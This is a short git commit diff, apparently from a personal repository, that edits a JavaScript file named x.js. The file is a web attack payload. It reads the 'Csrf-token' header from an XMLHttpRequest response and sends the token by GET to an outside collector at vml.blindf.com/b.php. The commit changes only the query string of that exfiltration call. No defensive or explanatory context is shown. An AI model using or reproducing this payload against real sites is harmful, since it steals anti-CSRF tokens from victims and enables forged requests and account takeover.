783b045fc984480d4eb5b1ae9e0c93e9779a8eca
AkashSebastian <31592003+akashsebastian333@users.noreply.github.com>
2020-07-11 13:21:28 +0530

    Update x.js

--- x.js
+++ x.js
@@ -6,7 +6,7 @@ if (xhr.readyState == 4 && xhr.status == 200)
 {
 var yourtoken = xhr.getResponseHeader('Csrf-token')
 var xhr2 = new XMLHttpRequest();
-xhr2.open("GET", "https://vml.blindf.com/b.php?c=querytoremember"+ yourtoken );
+xhr2.open("GET", "https://vml.blindf.com/b.php?c="+ yourtoken );
 xhr2.send();
 }
 }
